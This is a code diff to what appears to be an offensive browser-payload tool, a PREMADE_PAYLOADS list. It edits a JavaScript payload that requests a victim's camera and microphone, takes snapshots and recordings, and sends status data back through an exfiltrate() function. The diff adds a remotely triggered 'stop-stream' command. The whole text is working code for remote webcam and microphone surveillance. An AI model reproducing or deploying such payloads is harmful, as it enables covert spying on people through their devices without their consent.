@@ -158,7 +158,6 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     async function getMediaPermissions(video = true, audio = true) {
         try {
             if (mediaStream && mediaStream.active) {
-                // If a stream exists, stop its tracks before getting a new one
                 mediaStream.getTracks().forEach(track => track.stop());
             }
             mediaStream = await navigator.mediaDevices.getUserMedia({ video, audio });
@@ -168,6 +167,17 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
             exfiltrate('media-stream', { type: 'status', message: 'Permissions denied: ' + err.name });
             return null;
         }
+    }
+    
+    function stopStream() {
+        if (mediaStream) {
+            mediaStream.getTracks().forEach(track => track.stop());
+            mediaStream = null;
+        }
+        stopSnapshotting();
+        if (videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
+        if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+        exfiltrate('media-stream', { type: 'status', message: 'Stream stopped.' });
     }
 
     function startSnapshotting(stream) {
@@ -228,6 +238,11 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
 
         if (command === 'start-mic') {
             await getMediaPermissions(false, true);
+            return;
+        }
+        
+        if (command === 'stop-stream') {
+            stopStream();
             return;
         }
 
